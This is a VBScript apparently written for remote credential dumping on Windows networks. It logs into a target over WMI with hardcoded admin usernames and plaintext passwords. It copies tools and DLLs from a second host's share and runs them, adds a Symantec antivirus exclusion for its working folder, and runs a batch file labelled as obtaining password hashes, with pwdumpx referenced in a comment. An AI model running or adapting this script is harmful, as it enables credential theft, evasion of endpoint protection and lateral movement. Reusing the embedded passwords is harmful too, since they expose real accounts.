On Error Resume Next

dim strCommand, strComputer
strComputer = "10.57.131.21"
strCommand = "cmd.exe /c md c:\hash" 
'Логин админа
'strUser = "ce\a_v_peregudov"
strUser = "ce\CETL_Andrey"
'Пароль
'strPassword = "tr3falTX5"
strPassword = "l.k.j987TY"

' Create WMI object
'Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Dim objLocator: Set objLocator = CreateObject("WbemScripting.SWbemLocator")
Set objWMIService = objLocator.ConnectServer (strComputer, "root\cimv2", strUser, strPassword)  


RemoteExecute "Создаем папку"
MsgErr()
Wscript.Sleep (500)

strCommand = "xcopy \\10.57.131.155\start\hash\*.reg c:\hash\ /e"
RemoteExecute "Копируем reg файл"
MsgErr()
Wscript.Sleep (3000)
'AddReg()
'MsgErr()

strCommand = "xcopy \\10.57.131.155\start\hash\*.* c:\hash\ /e"
RemoteExecute "Копируем powershell scripts"
MsgErr()
Wscript.Sleep (5000)


strCommand = "regedit /s c:\hash\sym2.reg"
RemoteExecute "Добавляем reg файл"
MsgErr()
Wscript.Sleep (5000)

strCommand = "xcopy \\10.57.131.155\start\hash\msvctl.exe c:\hash /e"
RemoteExecute "Копируем папку"
MsgErr()

strCommand = "xcopy \\10.57.131.155\start\hash\*.bat c:\hash /e"
RemoteExecute "Копируем папку"
MsgErr()


strCommand = "xcopy \\10.57.131.155\start\hash\*.dll c:\hash /e"
RemoteExecute "Копируем папку"
MsgErr()


'strCommand = "c:\hash\pwdumpx.exe -l c:\hash\" & strComputer & ".txt + +"  
strCommand = "cmd mv.bat"
RemoteExecute "Получаем хеш"
MsgErr()

'DelProcess()
'MsgErr()

Function DelProcess()
	Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process")

	For Each objProcess in colProcessList
		colProperties = objProcess.GetOwner(strNameOfUser,strUserDomain)
		If strNameOfUser = "CETL_Andrey" Then
			objProcess.Terminate()
		End If	
	Next
End Function


Function AddReg()
	Const HKEY_LOCAL_MACHINE = &H80000002
	Set oReg = objWMIService.Get("StdRegProv")
	strKeyPath = "SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Directory\Client\1082004706"
	oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath
	
	strKeyPath = "SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Directory\Client\1082004706"
	strValueName = "Owner"
	dwValue = 4
	oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue
	
	strValueName = "ProtectionTechnology"
	dwValue = 1
	oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue
	
	strValueName = "FirstAction"
	dwValue = 11
	oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue

	strValueName = "SecondAction"
	dwValue = 11
	oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue

	strValueName = "ExcludeSubDirs"
	dwValue = 1
	oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue
	
	strValueName = "DirectoryName"
	strValue = "C:\\hash\\"
	oReg.SetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue

	strValueName = "ThreatName"
	strValue = "C:\\hash\\"
	oReg.SetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue
	
	strValueName = "ExtensionList"
	strValue = ""
	oReg.SetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue

End Function

Function RemoteExecute(msg)
	Set objNewProcess = objWMIService.Get("Win32_Process")
	MsgErr()
	WriteLog msg
	' Create process based on strCommand
	intReturn = objNewProcess.Create(strCommand, Null, Null, intProcessID)
	If intReturn <> 0 Then
		WriteLog " Process could not be created." & _
		vbNewLine & " Command line: " & strCommand & _
		vbNewLine & " Return value: " & intReturn
	Else
		WriteLog " Process created." & _
        vbNewLine & " Command line: " & strCommand & _
        vbNewLine & " Process ID: " & intProcessID
		'Do While objWMIService.execquery("select * from Win32_process where ProcessId = " & intProcessID).count > 0
		'	Wscript.sleep 2000
		'Loop
	End If
	
	
End Function 

Function MsgErr()
	If Err.Number <> 0 Then
		MsgBox "	" & Err.Number & " Источник: " & Err.Source & " Описание: " &  Err.Description
		Err.Clear
		WScript.Quit()
	End If
End Function

Function WriteLog(msg)
  WScript.StdOut.WriteLine msg
End Function